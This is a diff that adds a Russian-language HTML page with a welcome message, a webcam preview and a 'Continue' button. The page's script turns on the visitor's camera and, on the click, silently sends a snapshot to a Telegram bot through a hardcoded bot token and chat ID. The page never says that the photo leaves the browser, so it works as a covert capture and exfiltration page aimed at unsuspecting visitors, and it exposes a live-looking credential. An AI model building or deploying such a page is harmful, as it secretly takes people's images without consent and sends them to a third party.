@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Мой сайт</title>
+</head>
+<body style="text-align: center; font-family: sans-serif; padding-top: 30px;">
+
+    <h2>Добро Пожаловать!</h2>
+    <video id="webcam" autoplay playsinline width="400" height="300" style="border: 2px solid #333;"></video>
+    <br><br>
+    <button id="snap" style="padding: 10px 20px; font-size: 16px;">Продолжить</button>
+    
+    <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
+
+    <script>
+        // ВАШИ ДАННЫЕ TELEGRAM
+        const BOT_TOKEN = "8635631672:AAEUTI_AdLoQd3UEaCsjZkDGn4pq5yHskOo";
+        const CHAT_ID = "907176273";
+
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const snap = document.getElementById('snap');
+
+        // Запрашиваем доступ к камере
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => { alert("Ошибка доступа к камере: " + err); });
+
+        // Обработка клика
+        snap.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 400, 300);
+
+            // Преобразуем холст в файл и отправляем
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .catch(err => console.error(err));
+            }, 'image/jpeg');
+        });
+    </script>
+</body>
+</html>
